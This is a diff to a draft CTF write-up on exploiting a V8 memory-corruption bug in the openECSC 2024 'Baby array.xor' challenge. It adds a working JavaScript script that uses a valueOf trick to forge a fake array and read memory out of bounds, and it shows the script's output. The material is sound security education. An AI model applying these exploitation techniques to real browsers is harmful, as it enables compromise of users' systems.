@@ -9,7 +9,7 @@ summary = "todo: fill this and also the date"
 
 **(DRAFT)**
 
-Despite having 7 Chrome CVEs, I've never actually exploited a memory corruption in it's [V8 JavaScript engine](https://v8.dev/) before. [Baby array.xor](https://github.com/ECSC2024/openECSC-2024)<!-- TODO: link -->, a challenge at this year's openECSC CTF, was my first time going from a V8 bug to popping a `/bin/sh` shell.
+Despite having 7 Chrome CVEs, I've never actually exploited a memory corruption in its [V8 JavaScript engine](https://v8.dev/) before. [Baby array.xor](https://github.com/ECSC2024/openECSC-2024)<!-- TODO: link -->, a challenge at this year's openECSC CTF, was my first time going from a V8 bug to popping a `/bin/sh` shell.
 
 Most V8 exploits tend to have two sides to them - figuring out a unique way to trigger some sort of a memory corruption of at least one byte, and then following a common pattern of building upon that corruption to read arbitrary addresses (`addrof`), create fake objects (`fakeobj`), and eventually reach arbitrary code execution. This challenge was no different.
 
@@ -275,7 +275,7 @@ Quite the peculiar feature. It may seem a little confusing if you aren't familia
 
 It pretty much just interprets the double as an integer, and then performs the XOR operation on it. In this example we XORed the doubles with 0x539 (1337 in hex), so the last three hex digits of each double changed. It's a pretty silly operation to perform on a double.
 
-Just XORing doubles isn't going to get us anywhere though, since the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^2]) as just *raw 64-bit doubles*. All we can do is change some numbers around, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thingie on a mixed array (`PACKED_ELEMENTS`) consisting of *memory pointers* to other JavaScript objects, because we could point the pointers to places in memory we're not supposed to.
+Just XORing doubles isn't going to get us anywhere though, since the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^1]) as just *raw 64-bit doubles*. All we can do is change some numbers around, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thingie on a mixed array (`PACKED_ELEMENTS`) consisting of *memory pointers* to other JavaScript objects, because we could point the pointers to places in memory we're not supposed to.
 
 <!-- Alright, let's see if we can break it somehow.  .To achieve memory corruption, we must somehow use this xor functionality on an array that has other kinds of elements in it . We'll see later why that is, but for now let's just try to find a way to do it. -->
 
@@ -356,7 +356,7 @@ if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::ca
 }
 ```
 
-The **IsJSArray** method makes sure that we are in fact passing an array, and the **HasOnlySimpleReceiverElements** method checks for anything sus[^3] within the array or it's prototype.
+The **IsJSArray** method makes sure that we are in fact passing an array, and the **HasOnlySimpleReceiverElements** method checks for anything sus[^2] within the array or it's prototype.
 
 Hmmph, this seems pretty well coded so far. There is no way for us to get anything other than a basic double array past these checks, and XORing such an array isn't going to accomplish anything. I went on to carefully examine other parts of the code for any possible flaws.
 
@@ -415,9 +415,9 @@ And then it hit me - we're only doing all those fancy checks on the array itself
 
 We're cooking!
 
-## Part 2: Cooking up some primitives
+## Part 2: Breaking out of bounds
 
-Now that we've found a way to put some objects in an array and mess with them, we must figure out a way to turn that into the `addrof` and `fakeobj` primitives. There are a few different ways to accomplish this from here. I'll go with the path I took originally, but see if you can figure out any other ways to get there - I'll share a couple (arguably better ones) at the end of the post.
+Now that we've found a way to put some objects in an array and mess with their pointer, we must figure out a way to turn them into primitives we can actually use. There are a few different ways to accomplish this from here. I'll go with the path I took originally, but see if you can figure out any other ways to get there - I'll share a couple (arguably better ones) at the end of the post.
 
 But first, we should look at how v8 stores stuff in the memory so that we can figure out what our memory corruption looks like and what we can do with it. How could we do that?
 
@@ -478,7 +478,7 @@ Thread 1 "d8" received signal SIGTSTP, Stopped (user).
 (gdb) 
 ```
 
-In this example I made an array, used DebugPrint to see it's address, and then used gdb's `x/32xg`[^4] command to see the memory around that address. Going forward I'll be cleaning up the examples shown in the blog post, but this is essentially how you can follow along at home.
+In this example I made an array, used DebugPrint to see it's address, and then used gdb's `x/32xg`[^3] command to see the memory around that address. Going forward I'll be cleaning up the examples shown in the blog post, but this is essentially how you can follow along at home.
 
 <!-- todo: i don't think that's quite true -->
 You'll notice I subtracted 1 from the memory address before viewing it - that's because of tagged pointers! ~~In a `PACKED_ELEMENTS` array, doubles that~~ end with a 0 bit (even) are stored as-is, but everything ending with a 1 bit (odd) gets interpreted as a pointer, so a pointer to `0x1000` gets stored as `0x1001`. Because of this, we have to subtract 1 from all tagged pointers before checking out their address.
@@ -515,6 +515,8 @@ But let's try to understand what the gdb output above means:
 The array is at <span class="jsMemVar10">0xa3800042be8</span>, its <span class="jsMemVar6">properties list</span> is empty, it's a <code><span class="jsMemVar7">PACKED_DOUBLE_ELEMENTS</span></code> array with a <span class="jsMemVar8">length of 3</span><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref" style="color:#95dcff">4</a></sup> at <span class="jsMemVar9">0xa3800042bc9</span>. At that address we find a <span class="jsMemVar2">FixedDoubleArray</span> with a <span class="jsMemVar1">length of 3 (again)</span> and the doubles <span class="jsMemVar3">1.1</span>, <span class="jsMemVar4">2.2</span>, and <span class="jsMemVar5">3.3</span>.
 </div>
 </div>
+
+<span style="display: none">[^4]</span>
 
 Try <span class="fineText">hovering over</span><span class="coarseText">tapping on</span> the text and stuff above. You'll see what the memory values mean and how they're represented in the %DebugPrint output.
 
@@ -553,9 +555,9 @@ Pretty cool, let's see what happens if we put an array inside of another array:
 
 The memory order of the elements part here looks a little odd because it doesn't align with the 64-bit words. Instead of reading 64-bit values as `0x1111222233334444`, you have to read them as `0x3333444400000000 0x0000000011112222`.
 
-The array in our array is just stored as a pointer to that array! At the moment it is pointing at `0xa3800042be8` with our double array, but if we XOR this pointer to a different address we can make it point to any array or object we want... even if it doesn't "actually" exist!
+The array in our array is just stored as a pointer to that array! At the moment it is pointing at `0xa3800042be8` which has our double array, but if we XOR this pointer to a different address we can make it point to any array or object we want... even if it doesn't "actually" exist!
 
-Let's try to make a new array appear out of thin air. To do that, we have to put something in the memory that *looks* like an array, and then use XOR to point a pointer to it. I'm going to reuse the header of our first array at `0xa3800042be8`, changing the memory addresses to match with our new fake array.
+Let's try to make a new array appear out of thin air. To do that, we have to put something in the memory that *looks* like an array, and then use XOR to point a pointer to it. I'm going to reuse the header of our first array at `0xa3800042be8`, changing the memory addresses to match our new fake array.
 
 <div class="jsMem">
 <div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
@@ -588,7 +590,7 @@ That looks like a pretty good fake! And the length of 128 elements is a bonus - 
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">3.881131231533e-311</span></div>
 </div>
 
-Pretty easy! You'll notice I appended an `n` to our hex value - this is just to convert it to a [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt), which is required for the **BigUint64Array** but also gives us better accuracy in general[^6].
+Pretty easy! You'll notice I appended an `n` to our hex value - this is just to convert it to a [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt), which is required for the **BigUint64Array** but also gives us better accuracy in general[^5].
 
 Let's put these values in the array from earlier:
 
@@ -699,7 +701,7 @@ Wow! That fake array of ours has lots of cool data that we didn't put there. Let
 </div>
 </div>
 
-That's so cool!! It really is just picking up the next 1024 bytes of memory as floats and we can see it all by just looking at the array. In fact, we can even see our original `arr` array's header in elements 2 and 3, let's try to read it out from within JavaScript. We'll want a function to turn floats back into hex, for that we can just create the reverse of the `i2f` function from earlier.
+That's so cool!! It really is just picking up the next 1024 bytes of memory as doubles, letting us see it all by just looking at the array. In fact, we can even see the original `arr` array's header in elements 2 and 3, let's try to read it out from within JavaScript. We'll want a function to turn floats back into hex, for that we can just create the reverse of the `i2f` function from earlier.
 
 <div class="jsConsole">
 	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">f2i</span> = 
@@ -738,7 +740,7 @@ Exciting! Let's overwrite `arr`'s header with some random stuff and see what hap
 <div class="jsConBorder"></div>
 <div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
 <div class="jsConBorder"></div>
-<div class="jsConLine" style="white-space: pre-wrap; background: #000; color: #FFF; margin:0; padding: 4px">Received signal 11 SEGV_ACCERR 25ec1337133e
+<div class="jsConLine" style="white-space: pre-wrap; background: #000; color: #FFF; margin:0; padding: 4px">Received signal 11 SEGV_ACCERR 0a381337133e
 ==== C stack trace ===============================
  [0x555557b9ea23]
  [0x555557b9e972]
@@ -754,6 +756,116 @@ Whoops, yeah... there's the rub. The memory we're playing with is rather fragile
 We'll have to be a bit more careful going forward if we want to end up with anything more than a segmentation fault. And there's more to worry about later down the line because v8 also has a garbage collector that likes to swoop in every once in a while to rearrange the memory.
 
 This is a good time to figure out a plan for getting our primitives cooked up though.
+
+## Part 3: Cooking up some primitives
+
+In JavaScript exploitation, a memory corruption is usually turned into the **addrof** and **fakeobj** primitives. **addrof** is a function that tells us the address of a JavaScript object, and **fakeobj** is a function that returns a pointer to a memory address to be interpreted as an object, similar to what we did to create our fake array earlier.
+
+Let's take our research so far and wrap it up in a nice little script.
+
+```js
+// set up helper stuff
+const buffer = new ArrayBuffer(8);
+const floatBuffer = new Float64Array(buffer);
+const int64Buffer = new BigUint64Array(buffer);
+
+// bigint to double
+function i2f(i) {
+  int64Buffer[0] = i;
+  return floatBuffer[0];
+}
+
+// double to bigint
+function f2i(f) {
+  floatBuffer[0] = f;
+  return int64Buffer[0];
+}
+
+// bigint to 32-bit hex string
+function hex32(i) {
+  return "0x" + i.toString(16).padStart(8, 0);
+}
+
+// bigint to 64-bit hex string
+function hex64(i) {
+  return "0x" + i.toString(16).padStart(16, 0);
+}
+
+// set up variables
+const arr = [1.1, 2.2, 3.3];
+const tmpObj = {a: 1};
+const objArr = [tmpObj];
+
+// check the address of arr
+%DebugPrint(arr);
+
+// set up the fake array
+const arrAddr = 0x12345678n;
+const arrElementsAddr = arrAddr - 0x20n;
+const fakeAddr = arrElementsAddr + 0x10n;
+const fakeElementsAddr = arrElementsAddr + 0x8n;
+arr[0] = i2f(0x00000100000008a9n);
+arr[1] = i2f(0x00000725001cb7c5n);
+arr[2] = i2f(0x0000010000000000n + fakeElementsAddr);
+
+// do the exploit
+const tmp = [1.1];
+const evil = {
+  valueOf: () => {
+    tmp[0] = arr;
+    return Number(arrAddr ^ fakeAddr);
+  }
+};
+tmp.xor(evil);
+
+// this is the fake 128-element array
+const oob = tmp[0];
+
+// print out the data in the fake array
+for (let i = 0; i < oob.length; i++) {
+  const addr = hex32(fakeElementsAddr + BigInt(i + 1)*0x8n - 1n);
+  const val = hex64(f2i(oob[i]));
+  console.log(`${addr}: ${val}`);
+}
+```
+
+The beginning of the script sets up some helper functions. Then we create an array to store our fake array in as before, and also another array that has a random object in it.
+
+To set up the fake array, we must know where our real array is at in memory. There are ways to accomplish this, but for now we'll just run %DebugPrint and use its output to change the **arrAddr** value in the code to what the memory address should be. This approach works fine in a controlled environment like ours, but breaks apart when attacking browsers in the real world. I'll share an approach without this shortcoming at the end of the post.
+
+We can then guess how the rest of the memory lines up and use offsets to set a few other variables, such as the **fakeElementsAddr** which we add to the header of the fake array so that it points to where the fake array's elements are.
+
+Once everything's set up we do the xor exploit thing and end up with the fake array in `tmp[0]`. We assign it to the `oob` variable for convenience and print its memory out in a format similar to the gdb output. Let's run it!
+
+
+<div class="jsMem">
+	<div class="jsMemTitle">VARS<div class="jsMemSep"></div></div>
+	<div class="jsMemDbg">arr = [5.43231e-312, 3.88113e-311, 5.43231e-312]
+tmpObj = {a: 1}
+objArr = [tmpObj]
+tmp = [oob]
+oob = [...]</div>
+<div class="jsMemTitle">OUT<div class="jsMemSep"></div></div>
+	<div class="jsMemHex">$ ./d8 --allow-natives-syntax exploit.js
+0x000432e8: 0x00000725001cb7c5
+0x000432f0: 0x00000100000432e1
+0x000432f8: 0x00000725001cb7c5
+0x00043300: 0x00000006000432d9
+0x00043308: 0x00000725001d3b05
+0x00043310: 0x0000000200000725
+0x00043318: 0x0001000100000685
+0x00043320: 0x0000074d00000000
+0x00043328: 0x0000008400002af1
+0x00043330: 0x0000056d00000002
+0x00043338: 0x0004330900000002
+0x00043340: 0x00000725001cb845
+0x00043348: 0x0000000200043335
+...</div>
+<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
+<div class="jsMemLegend">
+</div>
+</div>
+
 
 <!--
 DebugPrint: 0x25ec00042be9: [JSArray]
@@ -1172,20 +1284,19 @@ todo:
 make sure we're in 0xa38 address space
 make sure we have mobile addresses available
 
+note: the v8/gdb highlighting thing doesn't work in the current version of ladybird because it doesn't support the :has() selector
+
 -->
-[^5]
 
-[^1]: If we could modify a boxed double - a special double that can also be tagged as a pointer - we could already use xor to corrupt memory, but `PACKED_DOUBLE_ELEMENTS` in V8 uses unboxed doubles.
+[^1]: `PACKED_DOUBLE_ELEMENTS` means that the array consists of doubles only, and it also doesn't have any empty "holes". A double array with holes would be `HOLEY_DOUBLE_ELEMENTS` instead.
 
-[^2]: `PACKED_DOUBLE_ELEMENTS` means that the array consists of doubles only, and it also doesn't have any empty "holes". A double array with holes would be `HOLEY_DOUBLE_ELEMENTS` instead.
+[^2]: [HasOnlySimpleReceiverElements](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-array.cc;l=42;drc=fe67713b2ff62f8ba290607bf7482a8efd0ca6cc) makes sure that there are no accessors on any of the elements, and that the array's prototype hasn't been modified.
 
-[^3]: [HasOnlySimpleReceiverElements](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-array.cc;l=42;drc=fe67713b2ff62f8ba290607bf7482a8efd0ca6cc) makes sure that there are no accessors on any of the elements, and that the array's prototype hasn't been modified.
+[^3]: `x/32xg` stands for: e(**x**)amine (**32**) he(**x**)adecimal (**g**)iant words (64-bit values). I recommend checking out [a reference](https://visualgdb.com/gdbreference/commands/x) to see other ways this command can be used.
 
-[^4]: `x/32xg` stands for: e(**x**)amine (**32**) he(**x**)adecimal (**g**)iant words (64-bit values). I recommend checking out [a reference](https://visualgdb.com/gdbreference/commands/x) to see other ways this command can be used.
+[^4]: In memory the length of the array is doubled (6 instead of 3) because each double value takes up two 32-bit "slots". TODO: factcheck this
 
-[^5]: In memory the length of the array is doubled (6 instead of 3) because each double value takes up two 32-bit "slots". TODO: factcheck this
-
-[^6]: JavaScript floating-point numbers can only accurately represent integers up to 2<sup>53</sup>–1. You *can* have larger numbers, but they won't be accurate. [BigInts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) are a separate data type that doesn't have this issue - they can be infinitely big while still being accurate! Well, perhaps not infinitely big, but [in V8](https://v8.dev/features/bigint) their size can be [over a billion bits](https://stackoverflow.com/a/70537884/2251833), which would be about 128MiB of just a single number.
+[^5]: JavaScript floating-point numbers can only accurately represent integers up to 2<sup>53</sup>–1. You *can* have larger numbers, but they won't be accurate. [BigInts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) are a separate data type that doesn't have this issue - they can be infinitely big while still being accurate! Well, perhaps not infinitely big, but [in V8](https://v8.dev/features/bigint) their size can be [over a billion bits](https://stackoverflow.com/a/70537884/2251833), which would be about 128MiB of just a single number.
 
 <style>
 	.challDetails {
